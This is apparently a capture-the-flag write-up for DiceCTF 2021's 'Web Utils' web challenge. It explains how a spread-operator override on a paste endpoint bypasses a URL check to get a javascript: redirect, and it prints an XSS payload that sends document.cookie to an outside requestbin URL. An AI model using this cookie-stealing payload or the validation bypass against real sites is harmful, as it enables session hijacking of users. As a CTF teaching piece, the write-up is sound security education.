# Web Utils (131 Solves/121 Points)

```
My friend made this dumb tool; can you try and steal his cookies? If you send me a link, I can pass it along.

dumb tool: https://web-utils.dicec.tf/
pass it along: https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=web-utils 
```

We are again given the source code `app.zip`, which seems to be much larger this time.

Looking at the site, we see a "`Link Shortener`" and "`Pastebin`", and as their name suggests, 1 takes a link and "shortens" it, while the other is a pastebin.

When we try to insert some kind of `HTML` into the `Pastebin`, we will see that it does not work at all. A quick look at the source code in `public/view.html` reveals why:

```javascript
document.title = 'Paste';
document.querySelector('div').textContent = data;
```

As seen above, the data that we sent is being set into `textContent`, which is **never renders any HTML/JS/CSS**, so this road is probably a dead-end.



Looking at the other function: `Link Shorterner`, we see something interesting:

```javascript
if (! data || ! type ) window.location = window.origin;
if (type === 'link') return window.location = data;
```

It seems like how this works is that it sets data (the link we entered), as `window.location` to redirect the user there.

As some might know, there is a way to **run Javascript in a URL** via something like `javascript:alert(1)`.

However, there is a cache to this. When we try to submit `javascript:alert(1)`, we will get an "Invalid URL" response.  Looking at `api.js` for the `createLink` endpoint, we will see why:

```javascript
const regex = new RegExp('^https?://');
      if (! regex.test(req.body.data))
        return rep
          .code(200)
          .header('Content-Type', 'application/json; charset=utf-8')
          .send({
            statusCode: 200,
            error: 'Invalid URL'
          });
```

There is a **Regex which restricts the start** to **strictly** `http://` or `https://` only, and it seems to be flawless. Hence we are unable to put `javascript` as the start.

Looking around the source code, we then noticed something was peculiar about the **parameters being called to `addData`**:

```javascript
database.addData({ type: 'link', ...req.body, uid });
```

`...` is a **spread operator in Javascript**. It will **<u>replace</u> any key-value pairs that are identical to the key-value pairs in `req.body`**

So what that means is that we can do something like:

```javascript
test = {a: 3}
test2 = {a: 1, b: 2, c:3, ...test}
> {a: 3, b: 2, c: 3}
```

and the value of `a` in `test2` is **overwritten** by the value in `test`.

Hence, we can make use of the **`createPaste`** endpoint to **skip the regex check**, and then **override `type` to a "link" so that will set the contents to `window.location`**. Hence, we have effectively created a "link" that has bypassed the regex check.

We can send the following payload via `POST` to `https://web-utils.dicec.tf/api/createPaste`

```json
{"data": "javascript: fetch(`https://requestbin.io/qykha7qy?data=${encodeURIComponent(document.cookie)}`)", "type": "link"}
```

and we get the link to send to the `Admin Bot`:

```json
{
    "statusCode": 200,
    "data": "mxXqx0q2"
}
//https://web-utils.dicec.tf/view/mxXqx0q2
```

This yields the flag:

```
dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}
```

